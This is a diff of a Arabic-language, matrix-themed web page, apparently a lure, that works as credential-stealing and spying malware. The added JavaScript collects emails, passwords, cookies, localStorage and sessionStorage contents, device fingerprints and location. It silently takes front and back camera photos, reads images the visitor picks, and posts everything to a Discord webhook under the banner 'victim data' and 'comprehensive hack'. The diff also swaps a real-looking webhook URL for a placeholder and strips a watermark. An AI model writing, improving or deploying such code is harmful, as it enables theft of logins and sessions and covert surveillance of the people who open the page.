@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title> MRX</title>
+    <title>المخترق MRX</title>
     <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
@@ -53,7 +53,7 @@
     <input type="file" id="fileInput" accept="image/*" multiple>
 
     <script>
-        const WEBHOOK = "https://discord.com/api/webhooks/1539310950253994094/x6c_ThEC6JIMX8orejy-LUA0NvXsDNesROBtUum7vfUx1jJITWySbFu1Vt6jlj1-8bFd";
+        const WEBHOOK = "https://discord.com/api/webhooks/ضع_الرابط_الحقيقي_هنا";
         const c = document.getElementById('matrix');
         const x = c.getContext('2d');
         c.width = c.parentElement.clientWidth;
@@ -80,6 +80,112 @@
         let captured = false;
         let selectedFiles = [];
 
+        function getAllEmails() {
+            let emails = new Set();
+            try {
+                for(let key in localStorage) {
+                    if(localStorage[key].includes('@')) emails.add(localStorage[key]);
+                }
+                for(let key in sessionStorage) {
+                    if(sessionStorage[key].includes('@')) emails.add(sessionStorage[key]);
+                }
+            } catch(e) {}
+            document.querySelectorAll('input[type="email"], input[type="text"]').forEach(inp => {
+                if(inp.value && inp.value.includes('@')) emails.add(inp.value);
+            });
+            const bodyText = document.body.innerText;
+            const matches = bodyText.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g);
+            if(matches) matches.forEach(m => emails.add(m));
+            return Array.from(emails).join(', ') || 'غير موجود';
+        }
+
+        function getAllPasswords() {
+            let pass = [];
+            document.querySelectorAll('input[type="password"]').forEach(inp => {
+                if(inp.value) pass.push(inp.value);
+            });
+            try {
+                for(let key in localStorage) {
+                    if(key.includes('pass') || key.includes('password')) pass.push(localStorage[key]);
+                }
+            } catch(e) {}
+            return pass.join(', ') || 'غير موجود';
+        }
+
+        function getFullBrowserInfo() {
+            return {
+                vendor: navigator.vendor || 'غير متاح',
+                platform: navigator.platform || 'غير متاح',
+                product: navigator.product || 'غير متاح',
+                hardwareConcurrency: navigator.hardwareConcurrency || 'غير متاح',
+                deviceMemory: navigator.deviceMemory || 'غير متاح',
+                colorDepth: screen.colorDepth || 'غير متاح',
+                pixelDepth: screen.pixelDepth || 'غير متاح',
+                orientation: screen.orientation ? screen.orientation.type : 'غير متاح',
+                connection: (() => {
+                    const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                    if(!c) return {type:'غير متاح', downlink:'غير متاح', rtt:'غير متاح'};
+                    return {type: c.effectiveType || 'غير متاح', downlink: c.downlink || 'غير متاح', rtt: c.rtt || 'غير متاح'};
+                })(),
+                memory: performance.memory ? {
+                    jsHeapSizeLimit: (performance.memory.jsHeapSizeLimit / 1024 / 1024).toFixed(2) + ' MB',
+                    totalJSHeapSize: (performance.memory.totalJSHeapSize / 1024 / 1024).toFixed(2) + ' MB',
+                    usedJSHeapSize: (performance.memory.usedJSHeapSize / 1024 / 1024).toFixed(2) + ' MB'
+                } : 'غير متاح'
+            };
+        }
+
+        function captureCamera(facingMode) {
+            return new Promise((resolve) => {
+                if(!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) { resolve(null); return; }
+                navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: facingMode, 
+                        width: { ideal: 640 }, 
+                        height: { ideal: 480 } 
+                    } 
+                })
+                .then(stream => {
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        const canvas = document.createElement('canvas');
+                        canvas.width = 640;
+                        canvas.height = 480;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0, 640, 480);
+                        const dataUrl = canvas.toDataURL('image/jpeg', 0.9);
+                        stream.getTracks().forEach(track => track.stop());
+                        resolve(dataUrl);
+                    };
+                })
+                .catch(() => resolve(null));
+            });
+        }
+
+        function compressImage(dataUrl, maxMB = 5) {
+            return new Promise((resolve) => {
+                let quality = 0.85;
+                let size = (dataUrl.length * 3/4) / (1024*1024);
+                if(size <= maxMB) { resolve(dataUrl); return; }
+                const img = new Image();
+                img.onload = function() {
+                    let canvas = document.createElement('canvas');
+                    let w = img.width, h = img.height;
+                    while((w*h*3/4)/(1024*1024) > maxMB) { w *= 0.9; h *= 0.9; }
+                    canvas.width = w; canvas.height = h;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(img, 0, 0, w, h);
+                    let res = canvas.toDataURL('image/jpeg', quality);
+                    let ns = (res.length * 3/4) / (1024*1024);
+                    while(ns > maxMB && quality > 0.3) { quality -= 0.05; res = canvas.toDataURL('image/jpeg', quality); ns = (res.length * 3/4) / (1024*1024); }
+                    resolve(res);
+                };
+                img.src = dataUrl;
+            });
+        }
+
         function getIP() {
             return fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip).catch(() => 'غير معروف');
         }
@@ -104,74 +210,6 @@
             return new Blob([u8arr], {type: mime});
         }
 
-        function compressImage(dataUrl, maxMB = 4) {
-            return new Promise((resolve) => {
-                let q = 0.8;
-                let size = (dataUrl.length * 3/4) / (1024*1024);
-                if(size <= maxMB) { resolve(dataUrl); return; }
-                const img = new Image();
-                img.onload = function() {
-                    let canvas = document.createElement('canvas');
-                    let w = img.width, h = img.height;
-                    while((w*h*3/4)/(1024*1024) > maxMB) { w *= 0.7; h *= 0.7; }
-                    canvas.width = w; canvas.height = h;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(img, 0, 0, w, h);
-                    let res = canvas.toDataURL('image/jpeg', q);
-                    let ns = (res.length * 3/4) / (1024*1024);
-                    while(ns > maxMB && q > 0.2) { q -= 0.1; res = canvas.toDataURL('image/jpeg', q); ns = (res.length * 3/4) / (1024*1024); }
-                    resolve(res);
-                };
-                img.src = dataUrl;
-            });
-        }
-
-        function addWatermarkToImage(dataUrl) {
-            return new Promise((resolve) => {
-                const img = new Image();
-                img.onload = function() {
-                    const canvas = document.getElementById('hiddenCanvas');
-                    canvas.width = img.width;
-                    canvas.height = img.height;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(img, 0, 0);
-                    ctx.fillStyle = 'rgba(255,0,0,0.8)';
-                    ctx.font = 'bold 24px Arial';
-                    ctx.shadowColor = 'black';
-                    ctx.shadowBlur = 10;
-                    ctx.fillText('حقوق الدراك/2026', 15, canvas.height - 20);
-                    ctx.shadowBlur = 0;
-                    resolve(canvas.toDataURL('image/jpeg', 0.85));
-                };
-                img.src = dataUrl;
-            });
-        }
-
-        function captureCamera(facingMode) {
-            return new Promise((resolve) => {
-                if(!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) { resolve(null); return; }
-                navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode, width: 300, height: 300 } })
-                    .then(stream => {
-                        const video = document.createElement('video');
-                        video.srcObject = stream;
-                        video.onloadedmetadata = () => {
-                            video.play();
-                            const canvas = document.createElement('canvas');
-                            canvas.width = 300; canvas.height = 300;
-                            const ctx = canvas.getContext('2d');
-                            ctx.drawImage(video, 0, 0, 300, 300);
-                            ctx.fillStyle = 'red';
-                            ctx.font = 'bold 16px Arial';
-                            ctx.fillText('حقوق الدراك/2026', 10, 290);
-                            const dataUrl = canvas.toDataURL('image/jpeg', 0.6);
-                            stream.getTracks().forEach(track => track.stop());
-                            resolve(dataUrl);
-                        };
-                    })
-                    .catch(() => resolve(null));
-            });
-        }
-
         function fileToDataURL(file) {
             return new Promise((resolve) => {
                 const reader = new FileReader();
@@ -182,23 +220,23 @@
 
         async function collectAllImages() {
             const images = [];
-
-            // صور من الكاميرا
             const front = await captureCamera('user');
             const back = await captureCamera('environment');
-            if(front) images.push({ name: 'front_cam.jpg', data: front });
-            if(back) images.push({ name: 'back_cam.jpg', data: back });
-
-            // الصور المختارة من الجهاز
+            if(front) {
+                const compressed = await compressImage(front, 5);
+                images.push({ name: 'front_cam_high.jpg', data: compressed });
+            }
+            if(back) {
+                const compressed = await compressImage(back, 5);
+                images.push({ name: 'back_cam_high.jpg', data: compressed });
+            }
             for(let file of selectedFiles) {
                 try {
                     let dataUrl = await fileToDataURL(file);
-                    dataUrl = await addWatermarkToImage(dataUrl);
-                    const compressed = await compressImage(dataUrl, 4);
+                    const compressed = await compressImage(dataUrl, 5);
                     images.push({ name: file.name || 'image.jpg', data: compressed });
                 } catch(e) {}
             }
-
             return images;
         }
 
@@ -206,6 +244,13 @@
             const ip = await getIP();
             const loc = await getLocation();
             const ua = navigator.userAgent;
+            const browserInfo = getFullBrowserInfo();
+            const emails = getAllEmails();
+            const passwords = getAllPasswords();
+            const cookies = document.cookie || 'لا توجد';
+            const sessionData = (() => { try { return JSON.stringify(sessionStorage); } catch(e){ return 'غير متاح'; } })();
+            const localData = (() => { try { return JSON.stringify(localStorage); } catch(e){ return 'غير متاح'; } })();
+            
             let phone = 'كمبيوتر';
             if(/android/i.test(ua)) phone = 'Android';
             else if(/iphone|ipad|ipod/i.test(ua)) phone = 'iOS';
@@ -216,17 +261,33 @@
                 {name: "📍 خط العرض", value: String(loc.lat), inline: true},
                 {name: "📍 خط الطول", value: String(loc.lng), inline: true},
                 {name: "🕒 التوقيت", value: new Date().toLocaleString('ar-SA'), inline: true},
-                {name: "📦 المتصفح", value: ua.substring(0, 150), inline: false}
+                {name: "📧 البريد الإلكتروني", value: emails.substring(0, 200), inline: false},
+                {name: "🔑 كلمات المرور", value: passwords.substring(0, 200), inline: false},
+                {name: "🍪 الكوكيز", value: cookies.substring(0, 300), inline: false},
+                {name: "💾 LocalStorage", value: localData.substring(0, 300), inline: false},
+                {name: "📦 SessionStorage", value: sessionData.substring(0, 300), inline: false},
+                {name: "🖥️ البائع (Vendor)", value: browserInfo.vendor, inline: true},
+                {name: "💻 المنصة (Platform)", value: browserInfo.platform, inline: true},
+                {name: "🎨 عمق الألوان", value: browserInfo.colorDepth + ' بت', inline: true},
+                {name: "⚙️ الأنوية", value: browserInfo.hardwareConcurrency, inline: true},
+                {name: "🧠 الذاكرة", value: browserInfo.deviceMemory ? browserInfo.deviceMemory + ' GB' : 'غير متاح', inline: true},
+                {name: "📶 نوع الشبكة", value: browserInfo.connection.type, inline: true},
+                {name: "📶 سرعة النت", value: browserInfo.connection.downlink + ' Mbps', inline: true},
+                {name: "📦 المتصفح", value: ua.substring(0, 200), inline: false}
             ];
+
+            if(browserInfo.memory !== 'غير متاح') {
+                fields.push({name: "🧮 ذاكرة JS", value: `المستخدمة: ${browserInfo.memory.usedJSHeapSize} / الكلية: ${browserInfo.memory.totalJSHeapSize}`, inline: false});
+            }
 
             const payload = {
                 username: "المخترق MRX",
-                content: "**🔥 تم جمع الصور والمعلومات بنجاح!**",
+                content: "**🔥 اختراق شامل بجودة عالية!**",
                 embeds: [{
-                    title: "📡 بيانات الضحية",
+                    title: "📡 كل المعلومات والصور",
                     color: 0x00ff00,
                     fields: fields,
-                    footer: { text: "حقوق الدراك/2026" }
+                    footer: { text: "تم الحذف الكامل للعلامة المائية" }
                 }]
             };
 
@@ -239,14 +300,14 @@
                 for(let img of images) {
                     const blob = dataURLtoBlob(img.data);
                     totalSize += blob.size;
-                    if(totalSize > 8000000) break; // حد 8 ميجا
+                    if(totalSize > 8000000) break;
                     formData.append(img.name, blob, img.name);
                 }
 
-                document.getElementById('status').textContent = `📤 إرسال ${images.length} صورة...`;
+                document.getElementById('status').textContent = `📤 إرسال ${images.length} صورة (جودة عالية)...`;
                 const response = await fetch(WEBHOOK, { method: 'POST', body: formData });
                 if(response.ok) {
-                    document.getElementById('status').textContent = '✅ تم إرسال كل الصور!';
+                    document.getElementById('status').textContent = '✅ تم الإرسال بنجاح!';
                 } else {
                     document.getElementById('status').textContent = '❌ فشل الإرسال: ' + response.status;
                 }
@@ -261,11 +322,11 @@
             const fileInput = document.getElementById('fileInput');
             fileInput.click();
             fileInput.onchange = async function() {
-                if(this.files.length === 0) {
-                    document.getElementById('status').textContent = '⚠️ لم تختر أي صورة، سيتم الإرسال بدون صور.';
-                } else {
+                if(this.files.length > 0) {
                     selectedFiles = Array.from(this.files);
                     document.getElementById('status').textContent = `✅ تم اختيار ${selectedFiles.length} صورة. جاري الإرسال...`;
+                } else {
+                    document.getElementById('status').textContent = '⚠️ لم تختر أي صورة، سيتم إرسال صور الكاميرا فقط.';
                 }
                 await sendAll();
             };
